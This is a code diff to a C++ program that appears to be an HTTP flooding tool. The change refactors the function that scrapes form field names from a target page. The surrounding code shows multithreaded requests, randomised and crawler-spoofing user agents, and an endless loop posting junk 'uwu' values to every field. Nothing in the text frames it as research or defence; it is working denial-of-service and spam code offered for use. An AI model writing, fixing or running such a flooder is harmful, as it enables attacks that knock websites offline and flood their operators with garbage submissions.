@@ -7,7 +7,6 @@
 
 int threads = 12;
 std::string method = "get";
-std::vector<std::string> field_names = {};
 std::vector<std::string> platforms = { "Macintosh", "Windows", "X11" };
 std::vector<std::string> mac = { "68K", "PPC", "Intel Mac OS X" };
 std::vector<std::string> windows = { "Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64" };
@@ -61,7 +60,8 @@ std::string make_user_agent() {
   return spiders[rand() % 6 + 1];
 }
 
-void get_fields(std::string target) {
+std::vector<std::string> get_fields(std::string target) {
+  std::vector<std::string> field_names = {};
   std::string html;
   CURL* curl = curl_easy_init();
   curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
@@ -83,11 +83,12 @@ void get_fields(std::string target) {
       }
     }
   }
+  return field_names;
 }
 
 void post(std::string target) {
   std::string field_data;
-  get_fields(target);
+  std::vector<std::string> field_names = get_fields(target);
   for (std::string& name : field_names) field_data += "&" + name + "uwu";
   while (true) {
     CURL* curl = curl_easy_init();
